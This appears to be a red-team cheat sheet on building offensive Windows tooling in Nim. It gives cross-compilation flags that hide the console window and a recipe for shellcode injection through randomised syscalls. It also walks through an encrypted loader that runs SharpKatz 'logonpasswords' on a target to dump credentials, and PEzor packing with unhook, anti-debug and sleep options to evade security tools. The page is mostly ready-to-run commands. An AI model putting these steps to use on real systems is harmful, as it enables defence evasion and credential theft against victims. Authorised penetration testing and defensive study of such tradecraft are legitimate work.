# Nim

* [https://github.com/byt3bl33d3r/OffensiveNim#why-nim](https://github.com/byt3bl33d3r/OffensiveNim#why-nim)
* [https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/](https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/)
* [https://github.com/S3cur3Th1sSh1t/Creds/tree/master/nim](https://github.com/S3cur3Th1sSh1t/Creds/tree/master/nim)




## Install

Windows:

* [https://nim-lang.org/install_windows.html](https://nim-lang.org/install_windows.html)
* [https://git-scm.com/download/win](https://git-scm.com/download/win)

Linux:

```
$ sudo apt install mingw-w64 -y
$ sudo apt install nim -y
Or
$ curl https://nim-lang.org/choosenim/init.sh -sSf | sh
```

Dependencies:

```
Nim > nimble install winim nimcrypto zippy
```




## Compilation

Basic:

```
Nim > nim c program.nim
```

To not popup the Nim binaries console window:

```
Nim > nim c --app:gui program.nim
```

For the best size:

```
Nim > nim c -d:danger -d:strip --opt:size --passC=-flto --passL=-flto program.nim
```

For Windows on Linux:

```
$ nim c --cpu:amd64 --os:windows --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc program.nim
```




## Inject Shellcode



### NimlineWhispers

* [https://ajpc500.github.io/nim/Shellcode-Injection-using-Nim-and-Syscalls/](https://ajpc500.github.io/nim/Shellcode-Injection-using-Nim-and-Syscalls/)
* [https://github.com/ajpc500/NimlineWhispers](https://github.com/ajpc500/NimlineWhispers)
* [https://github.com/snovvcrash/NimlineWhispers](https://github.com/snovvcrash/NimlineWhispers)

1. Generate a nim header with syscalls definitions (function names randomized): `python3 NimlineWhispers.py --randomise`.
2. Repair the [*shellcode_bin.nim*](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/shellcode_bin.nim) template to fit new function names.
3. Generate a shellcode of your choice, put it into the template and compile the binary: `nim c -d=mingw --app=console --cpu=amd64 shellcode_bin.nim`.




## Execute C# Assemblies

* [https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypt_assembly.nim](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypt_assembly.nim)
* [https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypted_assembly_loader.nim](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypted_assembly_loader.nim)

Compile on Linux:

```
$ nim c encrypt_assembly.nim
$ nim c --cpu:amd64 --os:windows --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc -d:danger -d:strip --opt:size --passC=-flto --passL=-flto encrypted_assembly_loader.nim
```

Create encrypted base64 file:

```
$ ./encrypt_assembly 'Passw0rd!' SharpKatz.exe b64.txt
```

Decrypt and run it on target:

```
Cmd > .\encrypted_assembly_loader.exe Passw0rd! b64.txt --Command logonpasswords
```



### Chaining with PEzor

* [https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim)
* [https://github.com/S3cur3Th1sSh1t/Creds/blob/master/helpers/CSharpToNimByteArray.ps1](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/helpers/CSharpToNimByteArray.ps1)
* [https://github.com/phra/PEzor](https://github.com/phra/PEzor)

Convert a C# assembly to Nim array with a helper [script](https://github.com/snovvcrash/Creds/blob/master/helpers/CSharpToNimByteArray.ps1):

```
$ pwsh -exec bypass
PS > . ./CSharpToNimByteArray.ps1
PS > CSharpToNimByteArray -inputfile csharp.exe
```

Compile the executable and wrap it into PEzor:

```
Cmd > nim c --passL:-Wl,--dynamicbase,--export-all-symbols execute_assembly_bin.nim
$ bash PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 execute_assembly_bin.exe -z 2
```
